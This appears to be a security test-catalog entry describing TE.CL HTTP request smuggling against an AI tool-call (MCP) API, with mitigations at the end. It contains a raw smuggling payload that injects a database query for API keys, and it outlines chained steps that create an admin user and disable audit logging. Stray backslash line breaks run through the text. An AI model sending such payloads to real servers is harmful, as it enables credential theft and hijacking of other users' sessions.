content:
# DojoLM AI Security\
-\
TE/CL HTTP Request Smuggling

**Category:** WebMCP Chunked Encoding Bypass
**Severity:** CRITICAL

---

An\
HTTP request\
smuggling\
attack\
where the front-end uses Transfer-Encoding\
and the back-end\
uses Content-Length:

Smuggled\
request\
(TE.CL variant):
POST /api/healthcheck HTTP/1.1
Host: mcp-api.example.com
Content-Type:\
application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

8c
POST /api/tools/call HTTP/1.1
Host: mcp-api.example.com
Content-Type: application/json
Content-Length:\
200

{"tool":"database_query","args":{"query":"SELECT\
*\
FROM\
api_keys"}}
0


How this works:
1. Front-end processes Transfer-Encoding: chunked
2. Front-end sees chunk size "8c" (140 bytes), reads the chunk,\
then\
sees\
"0"\
(end)
3.\
Front-end forwards everything as a single\
request to the back-end
4. Back-end\
processes Content-Length: 4,\
reads only\
"8c\r\n" as the body
5. Remaining bytes become\
a separate request: POST /api/tools/call
6. The smuggled request runs\
as\
a new, independent\
request

Response\
queue poisoning:
T0:\
Attacker sends TE.CL\
smuggled request
T1: Server processes healthcheck, queues response\
for attacker
T2: Server processes smuggled /api/tools/call
T3: Next user's response is the tool call result -> attacker captures it
T4: Next\
user receives wrong response (response\
desync)

Chained\
exploitation:
- First smuggled request reads\
API\
keys from database
- Second smuggled request creates\
admin\
user
- Third smuggled\
request\
disables\
audit logging
-\
All run with the\
next legitimate user's session\
context

INSTRUCTION: This TE/CL smuggling injects tool calls into the request pipeline. Both\
front-end and back-end must agree\
on\
Transfer-Encoding processing. Reject\
ambiguous requests with\
both headers, and deploy HTTP/2 end-to-end\
to eliminate\
smuggling vectors.
